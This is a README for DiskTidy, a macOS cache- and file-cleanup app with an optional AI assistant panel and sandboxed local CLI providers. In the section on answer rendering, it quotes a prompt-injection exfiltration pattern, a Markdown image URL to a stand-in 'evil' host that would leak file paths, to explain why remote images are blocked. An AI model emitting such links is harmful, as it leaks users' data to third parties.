# DiskTidy

A macOS disk-cleanup utility. Review and clear app caches, simulators, build caches, and large files from one window.

[한국어](README.md) · MIT License

> The app UI is currently Korean-only. Localization contributions are welcome.

<img src="docs/screenshots/01-storage.png" width="820" alt="DiskTidy SSD usage screen">

## Screens

| | |
|---|---|
| **App caches** — `~/Library/Caches` by size<br><img src="docs/screenshots/02-cache.png" width="400" alt="App caches screen"> | **Simulators** — least recently used on top<br><img src="docs/screenshots/03-simulator.png" width="400" alt="Simulators screen"> |
| **Project caches** — recursive build-cache scan<br><img src="docs/screenshots/04-project-cache.png" width="400" alt="Project caches screen"> | **Large files** — files over 200 MB<br><img src="docs/screenshots/06-big-files.png" width="400" alt="Large files screen"> |
| **Android caches** — Gradle · Android Studio<br><img src="docs/screenshots/07-android-cache.png" width="400" alt="Android caches screen"> | **Android emulators** — AVD list<br><img src="docs/screenshots/08-android-emulator.png" width="400" alt="Android emulators screen"> |

The menu-bar item shows SSD usage at all times; clicking it opens a minimal dropdown.

<img src="docs/screenshots/09-menubar.png" width="240" alt="Menu bar dropdown">

> These are real screenshots from daily use. Only the personal parts — cache entry names and project paths — are blurred.

## Features

Eleven screens in a sidebar, plus a persistent menu-bar item and an AI assistant panel on the right.

| Screen | Contents |
|---|---|
| SSD usage | Total / used / free capacity and usage percentage |
| App caches | Per-app directories under `~/Library/Caches` |
| Simulators | iOS simulators sorted by last use; delete device or erase data |
| Project caches | Recursive scan for build caches under folders you pick (rules below) |
| Xcode caches | `DerivedData`, iOS/watchOS/tvOS DeviceSupport, Archives |
| Large files | Files over 200 MB under folders you pick (defaults to `~/Downloads`) |
| Android caches | Gradle caches and distributions, `~/.android` caches, Android Studio IDE caches |
| Android emulators | AVDs in `~/.android/avd`; deletion also clears the `.ini` pointer |
| Temp files | Top-level entries in `/private/tmp` and `$TMPDIR` (safety rules and limits below) |
| Dev daemons | Memory and swap metrics; terminate long-running dev daemons (Gradle, Kotlin) |
| Settings | AI provider connection (provider, API root URL, model, API key), local CLI provider opt-in, window behavior (always on top) |

The menu-bar item shows SSD usage, refreshed every 60 seconds. Clicking it opens a minimal dropdown with a gauge plus Open / Quit.

## The window stays on top

With no Dock icon (`LSUIElement`), a window that slips behind another app is unreachable. So opening the window handles activation, front ordering and Space placement together, and **always on top** is on by default (turn it off under Settings → 창).

Activation alone measurably is not enough: when another app is full-screen it owns the active Space and our window stays on a different one — `lsappinfo` reports DiskTidy as frontmost and `CGWindowList` puts the window inside screen bounds, yet a screenshot captures only the full-screen editor. So the window level goes to `.floating` with `canJoinAllSpaces` and `fullScreenAuxiliary` (or `.normal` + `moveToActiveSpace` when always-on-top is off). Right after launch SwiftUI may not have created the window yet, so the presenter retries briefly until it exists.

## AI assistant

The speech-bubble toolbar button opens a panel on the right. It answers **from the screen you are currently looking at** — item count and total, selection state, the top 40 rows, scan state, error banner, and how that screen deletes things are rebuilt on every question and sent as the system prompt. Tabs register a snapshot function rather than a value, so asking after a scan finishes describes the current list, not an empty one.

| Provider | Default root | Wire format |
|---|---|---|
| Anthropic (Claude) | `https://api.anthropic.com` | Messages API |
| OpenAI | `https://api.openai.com` | Chat Completions |
| Ollama (local) | `http://localhost:11434` | Chat Completions compatible |
| OpenAI-compatible (custom) | you provide | Chat Completions |

The app appends the version path (`/v1/messages`, `/v1/chat/completions`). Enter the root only; a trailing slash, a `/v1`, or a full endpoint path copied from the docs is absorbed.

### Item explanation button (ⓘ)

Every list row has an ⓘ button that opens a popover explaining what the item is and whether it is safe to delete. **Items the app already knows are never sent to AI** — most listed paths were put there by the app itself (e.g. `~/.gradle/caches`), so asking a model to guess their identity is slower, costlier and less accurate. Entries in `KnownItemCatalog` (DerivedData, Archives, DeviceSupport, Gradle caches, …) show instantly with no AI configured; only unfamiliar paths in the large-file and temp-file tabs and unknown processes go to the model. Answers are cached, so pressing the same item again does not re-ask.

**Models are picked from a dropdown.** The settings screen fetches `GET /v1/models` when it opens (both wire formats return the same shape). Embedding, speech, image and moderation models are filtered out — picking one only produces a failure. Turn on **직접 입력** (manual entry) for names that are not in the list, such as an internal gateway or a preview model. Listing does not require a model name; not knowing the name is the reason to list.

**API keys are the default.** The app does not proxy subscription credentials. Anthropic [explicitly does not permit](https://code.claude.com/docs/en/legal-and-compliance) third-party developers to offer claude.ai login or to route requests through Free/Pro/Max credentials on their users' behalf, and reserves the right to enforce without notice; ChatGPT subscriptions likewise do not include API usage (separate billing). To run without a key, choose a local provider such as Ollama — or turn on the local CLI path below yourself.

### Local CLI providers (opt-in)

Settings → **로컬 CLI 제공자** adds two providers to the list. It is off by default and asks for confirmation once when you turn it on.

- **Claude Code CLI · 구독 로그인**
- **Codex CLI · 구독 로그인**

Each runs the official CLI you are already logged into as a child process and uses its output as the answer:

```
claude -p <whole transcript> --model sonnet \
       --output-format stream-json --include-partial-messages --verbose \
       --append-system-prompt <system prompt incl. screen snapshot> \
       --disallowed-tools Bash Edit Write NotebookEdit WebFetch WebSearch Task Read Glob Grep \
       --strict-mcp-config

codex exec --json --sandbox read-only --skip-git-repo-check --ephemeral \
       <rules + screen snapshot + whole transcript>
```

What it deliberately does **not** do matters more: it never reads subscription OAuth tokens and never spoofs client headers. That pattern is blocked server-side and is grounds for account suspension. This runs the same command you would type in a terminal, under the same credentials, and the app never sees or stores them.

Requests still go out **on your subscription**, so whether each provider's terms allow it is yours to verify — hence the default-off switch and the confirmation. This cannot ship through the App Store (the sandbox forbids executing external binaries); direct DMG distribution only.

Guardrails: Claude Code gets every tool denied (the screen snapshot is already in the prompt, and an open tool would let this app edit files or run commands) plus `--strict-mcp-config`. Codex has no switch to disable tools wholesale, so it runs under `--sandbox read-only` and `--ephemeral` (no session files). Both use `$TMPDIR` as the working directory and a 180-second timeout.

**Streaming differs per tool.** Claude Code streams token by token (without `--include-partial-messages` only completed blocks arrive, which collapses into one chunk). Codex has no delta option in `codex exec --json`, so the reply appears at once — a progress indicator holds the answer's place until then.

**Models**: Claude Code takes CLI aliases (`sonnet`, `opus`, `haiku`). For Codex, **leave the model field empty** to use whatever `~/.codex/config.toml` selects — the valid set depends on account type and CLI version, so the app does not choose for you.

Setup: log in once in a terminal, then put the output of `which claude` (or `which codex`) into **CLI 실행 파일 경로** in Settings. The default scans common install locations and nvm version directories, because a GUI-launched app only has `PATH=/usr/bin:/bin`. CLIs installed via npm are `#!/usr/bin/env node` shims that also need `node`, so the child process gets the executable's own directory prepended to `PATH`.

**What leaves your machine** — each question sends that screen's **item names, paths, sizes and selection state** to the provider you chose. File contents are never sent. To keep everything local, use a local provider such as Ollama.

**Key storage** — API keys live in the macOS keychain (`com.jimmy.disktidy.ai`), one entry per provider. `UserDefaults` holds only the provider, root URL and model. Ad-hoc signed builds change signing identity on every build, so the keychain will re-prompt for access.

**The assistant cannot operate the app.** No tool calling is wired up. Deleting, erasing and terminating always require you to press the button yourself, confirmation dialogs included.

Requests are never sent over plaintext `http` to a remote host (key exposure). `http` is allowed for loopback (`localhost`, `127.0.0.1`, `::1`), and for `*.local` LAN addresses **only with providers that need no API key**.

Answers render with [MarkdownView](https://github.com/LiYanan2004/MarkdownView) — chosen for incremental streaming parsing and text selection across blocks — with two defaults changed. **Remote images are never fetched**: file paths in the screen snapshot could steer the model into emitting `![](https://evil/?p=...)`, which would leak the path the moment the answer renders. **Syntax highlighting and math rendering are off**: the library's default style locates resources via `Bundle.module`, and in an ad-hoc-signed app shipping that bundle in the `.app` root breaks codesigning while omitting it crashes on other machines (measured). Messages you type stay verbatim, so a `*` you wrote is not eaten as formatting.

Answers are capped at 1024 tokens. When the cap truncates a reply, the app appends `(답변이 길이 제한으로 잘렸습니다.)` — a truncated answer must not read as a complete one.

## Project cache detection rules

Directories whose names unambiguously mean "build cache" are matched by name. Generic names require a marker file in the parent directory.

| Rule | Directories | Condition |
|---|---|---|
| By name | `Pods` `DerivedData` `.gradle` `Carthage` `.dart_tool` `.next` `.expo` | none |
| Marker required | `node_modules` `dist` | `package.json` in parent |
| Marker required | `target` | one of `Cargo.toml` `pom.xml` `build.gradle` `build.gradle.kts` |
| Marker required | `build` | one of `package.json` `build.gradle` `build.gradle.kts` `CMakeLists.txt` `pom.xml` |
| Marker required | `.build` | `Package.swift` in parent |

`build`, `dist`, and `target` can be committed source directories, so they are left alone without a marker. Overly broad scan roots (`/`, `~`, `/Users`, …) are rejected.

## Temp-file safety rules

`/tmp` is a shared directory. Its top level mixes unix sockets, files owned by other users, and markers that are still in use. An entry becomes a deletion candidate only if it passes **all five** rules. Anything that cannot be decided is dropped from the list.

| # | Rule |
|---|---|
| 1 | Owned by me (`st_uid == getuid()`) |
| 2 | Regular file or directory — sockets, FIFOs and symlinks are excluded |
| 3 | **Both** `atime` and `mtime` older than 3 days |
| 4 | Not reported as an open path by `lsof` |
| 5 | Not a root directory itself |

A directory must pass rules 1–4 for its **entire subtree**, not just itself. One socket or one open file anywhere inside removes the whole directory from the list.

Three more guards apply:

- **Mount boundaries are never crossed.** The candidate and every entry below it must share the root's `st_dev`. Renaming a directory that *contains* a mount point succeeds, so without this the recursive delete would reach into the mounted volume.
- **Directories without owner write permission are not candidates.** A `0555` directory can be listed but its children cannot be unlinked. Deletion is not atomic, so it would stop halfway — and the changed mtime then blocks restore as well.
- **Subtree depth is capped at 64.** Beyond that the entry is treated as undecidable and dropped.

### Observation limits

- **Non-root `lsof` cannot fully see file handles held by root or other users' processes.** A file such a process is holding may look closed.
- **`atime` does not prove a recent read.** Filesystems may not update it, so it is never treated as proof of use — only as an additional gate.
- In other words this feature conservatively filters on **state observable from user space only**. Its threat model does not include a hostile process running as the same UID.
- **App Sandbox / Mac App Store distribution is not supported.** Access to `/private/tmp` assumes a directly distributed app with no entitlements.
- If `lsof` or root enumeration fails, the result is an **error**, not an empty list. The list is cleared and a warning banner is shown so the delete button never opens on unverified entries.

## Deletion policy

- App caches, project caches, Xcode caches, large files, Android caches, Android emulators: **moved to Trash** (`FileManager.trashItem`) — recoverable.
- Simulator delete / erase: `xcrun simctl delete` / `erase` — irreversible, so a confirmation dialog is shown first.
- **Temp files: permanent delete.** Moving them to the Trash would not reclaim any disk blocks until the user empties it, which defeats the purpose. Because it is irreversible, a confirmation dialog is always shown. The procedure keeps the scan-time `st_dev + st_ino + uid + mode + mtime + atime`, re-checks it against the parent directory FD right before deletion, atomically moves the entry into a dedicated quarantine directory on the same volume with `renameatx_np(RENAME_EXCL)`, and deletes it only if the identity still matches at the quarantine location. If the app dies mid-move, the quarantined entry shows up in a **pending recovery** list on the next launch and is never removed automatically.
- A successful deletion means "the path was removed". APFS snapshots or open files can delay the free-space increase, so the UI reports the number of deleted paths and the freshly read free space **separately**, and promises no amount reclaimed.
- Failures (insufficient permissions, files in use, booted simulators) surface as an in-app warning banner and the item stays in the list. Details go to Console.app under the `com.jimmy.disktidy` subsystem.

## Requirements

- macOS 14 or later
- Xcode 26 or later — the MarkdownView 3.0.0 dependency requires the Swift 6.2 toolchain (tests use Swift Testing)
- macOS will prompt for file access (TCC) to `~/Documents`, `~/Downloads`, etc. on first run

## Running

```bash
./Scripts/run.sh          # dev mode (release build, runs immediately, shows a Dock icon)
swift test                # tests
```

## Installation

### Download (DMG)

**Step 1.** Grab `DiskTidy-<version>.dmg` from [Releases](../../releases), open it, and drag `DiskTidy.app` onto `Applications`.

<img src="docs/screenshots/10-install-dmg.png" width="600" alt="Open the DMG and drag DiskTidy.app onto Applications">

Verify integrity:

```bash
shasum -a 256 -c DiskTidy-1.0.dmg.sha256
```

### Build from source

```bash
./Scripts/build-app.sh    # release build → DiskTidy.app → installs to /Applications
./Scripts/make-dmg.sh     # release build → dist/DiskTidy-<version>.dmg + .sha256
./Scripts/make-app.sh     # DiskTidy.app bundle only (no install, no packaging)
```

`LSUIElement=true` in `Info.plist` means the installed `.app` lives only in the menu bar, with no Dock icon.

### First launch (Gatekeeper)

This app is **ad-hoc signed (free) and therefore not notarized by Apple.** macOS will block the first launch with the warning below. That is expected.

<img src="docs/screenshots/11-install-gatekeeper.png" width="260" alt="Gatekeeper warning: 'DiskTidy' Not Opened">

> **Do not click Move to Trash.** Click `Done` and follow the steps below.

**macOS 15 Sequoia and later** — Apple removed the right-click → Open bypass. Allow it this way:

1. Launch `DiskTidy.app` once, then dismiss the block warning
2. Go to **System Settings → Privacy & Security**
3. Scroll down to the DiskTidy entry and click **"Open Anyway"**

**macOS 14 Sonoma** — **right-click → Open** once; subsequent launches work normally.

**From the terminal** (works on any version):

```bash
xattr -dr com.apple.quarantine /Applications/DiskTidy.app
```

To inspect the signature before trusting it:

```bash
codesign -dv --verbose=4 /Applications/DiskTidy.app
```

Each build generates a fresh ad-hoc signature, so macOS may re-ask for folder permissions (TCC) after reinstalling.

**If you fork:** change `CFBundleIdentifier` in `Info.plist` (`com.jimmy.disktidy`) and the logger subsystem in `TrashService`, `PermanentDeleter` and `TempCleanupViewModel` to your own. To notarize, you need an Apple Developer Program membership ($99/year), then `codesign --options runtime --sign "Developer ID Application: ..."` plus `xcrun notarytool submit`.

## Design notes

- **`ShellRunner` discards stderr via `FileHandle.nullDevice`.** With a `Pipe`, once the child fills the 64 KB pipe buffer it blocks on write while the parent waits forever reading stdout. `find`'s "Permission denied" output alone exceeds that, and the app really did hang. Covered by a regression test.
- **`DiskScanner.sizes(of:)` batches paths into one `du -sk` call.** Spawning one process per entry means 100+ fork/exec calls for `~/Library/Caches` alone.
- **Six cache tabs share a single `CleanableListViewModel`,** injecting only the scanner closure. Scanning and deletion both run off the main thread, and refresh is guarded against re-entry.
- **The temp-files tab is the one tab that does not use `CleanableListViewModel`.** `CleanableItem.id` is a fresh `UUID()`, so it does not preserve file identity as of the scan. Using it for an irreversible delete would remove whatever file happens to carry that name at deletion time. `TempCandidate` carries the raw `lstat` values instead, with its own view model and view.
- **`lsof` runs exactly once per scan.** `lsof +D /private/tmp` walks the whole tree and is unusable. `lsof -w -n -F0n -u <uid>` returns every open path for the user's processes as NUL-terminated fields in one shot (measured: 1.2 s, ~89,000 fields). Parsing line by line breaks on filenames containing newlines.
- **AI screen context is registered as a closure, not a value.** Each tab hands `ChatContextStore` a snapshot function in `onAppear`, and the assistant calls it the moment you send a message. Freezing a value would describe the empty list captured before a 26 GB tree scan finished.
- **Four providers, one client.** There are only two real wire formats — Anthropic Messages and OpenAI Chat Completions — so `AIWireFormat` splits request building (`AIRequestBuilder`) and SSE parsing (`AIStreamParser`). Both are pure functions and are tested without a network.
- **Scanning and deletion share one root policy (`TempRootPolicy.production`).** If the two disagreed, every safety rule would collapse, so no API taking a root is exposed to the UI or to callers of the deleter.
- **Path containment compares UTF-8 bytes, not `String.hasPrefix`.** `hasPrefix` works on grapheme clusters, so a filename starting with a combining mark merges with the `/` separator and a real descendant is judged "not a descendant".

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md).

---
Author: JunyoungJung
